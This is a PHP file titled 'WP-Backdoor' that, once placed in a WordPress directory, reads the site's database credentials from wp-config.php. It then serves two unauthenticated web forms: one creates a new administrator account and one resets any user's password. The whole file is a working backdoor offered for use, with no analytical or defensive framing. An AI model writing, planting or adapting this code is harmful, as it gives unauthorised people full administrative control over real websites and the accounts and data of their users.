<?php
/*
This is free and unencumbered software released into the public domain.

Anyone is free to copy, modify, publish, use, compile, sell, or
distribute this software, either in source code form or as a compiled
binary, for any purpose, commercial or non-commercial, and by any
means.

In jurisdictions that recognize copyright laws, the author or authors
of this software dedicate any and all copyright interest in the
software to the public domain. We make this dedication for the benefit
of the public at large and to the detriment of our heirs and
successors. We intend this dedication to be an overt act of
relinquishment in perpetuity of all present and future rights to this
software under copyright law.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.

For more information, please refer to <http://unlicense.org>
*/

// File for SQL credentinals
require "wp-config.php";
// File for hash algo
require "wp-includes/class-phpass.php";

// Instance of the hash algo
$b_hasher = new PasswordHash(8, TRUE);

// MySQL credentinals
$b_server = DB_HOST;
$b_dbname = DB_NAME;
$b_username = DB_USER;
$b_password = DB_PASSWORD;

$b_pdo = new PDO("mysql:host=$b_server;dbname=$b_dbname", $b_username, $b_password);

if(isset($_GET["create"])) {
	$b_username = $_POST["username"];
	$b_email = $_POST["email"];
	$b_password = $_POST["password"];
	$b_password = $b_hasher->HashPassword(trim($b_password));

	// Create user
	$b_stmnt = $b_pdo->prepare("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, display_name) VALUES (?, ?, ?, ?, ?)");
	$b_stmnt->execute(array($b_username, $b_password, $b_username, $b_email, $b_username));

	// Get user id
	$b_stmnt = $b_pdo->prepare("SELECT * FROM wp_users WHERE user_login = ?");
	$b_stmnt->execute(array($b_username));
	$b_user = $b_stmnt->fetch();
	$b_user = $b_user["ID"];

	// Give user admin privileges
	// Settings for the user
	$b_admin_vals = [
		["nickname", $b_username],
		["first_name", ""],
		["last_name", ""],
		["description", ""],
		["rich_editing", "true"],
		["syntax_highlighting", "true"],
		["comment_shortcuts", "false"],
		["admin_color", "fresh"],
		["use_ssl", "0"],
		["show_admin_bar_front", "true"],
		["locale", ""],
		["wp_capabilities", 'a:1:{s:13:"administrator";b:1;}'],
		["wp_user_level", "10"],
		["dismissed_wp_pointers", "wp496_privacy"]
	];

	for($b_i = 0; $b_i < count($b_admin_vals); $b_i++) {
		$b_first = $b_admin_vals[$b_i][0];
		$b_second = $b_admin_vals[$b_i][1];

		$b_stmnt = $b_pdo->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
		$b_stmnt->execute(array($b_user, $b_first, $b_second));
	}
	$success = "<p style='color: green;'>User created, you can now <a href='wp-admin/'>login</a></p>";
}

elseif($_GET["reset"]) {
	$b_username = $_POST["username"];
	$b_password = $_POST["password"];
	$b_password = $b_hasher->HashPassword(trim($b_password));

	$b_stmnt = $b_pdo->prepare("UPDATE wp_users SET user_pass = ? WHERE user_login = ?");
	$b_stmnt->execute(array($b_password, $b_username));
	$success = "<p style='color: green;'>Password for $b_username changed, you can now <a href='wp-admin/'>login</a></p>";
}

?>
<html>
	<head>
		<meta charset="utf-8">
		<title>WP-Backdoor</title>
	</head>
	<body>
		<?php
		if(isset($success)) {
			echo $success;
		}
		?>
		<h3>Create new Admin-User</h3>
		<form action="?create=1" method="post">
			Username:<br>
			<input type="text" name="username"><br>
			E-Mail:<br>
			<input type="email" name="email"><br>
			Password:<br>
			<input type="password" name="password"><br><br>
			<input type="submit" value="Submit">
		</form>
		<hr>
		<h3>Reset Password</h3>
		<form action="?reset=1" method="post">
			Username:<br>
			<input type="text" name="username"><br>
			New Password:<br>
			<input type="password" name="password"><br><br>
			<input type="submit" value="Submit">
		</form>
	</body>
</html>
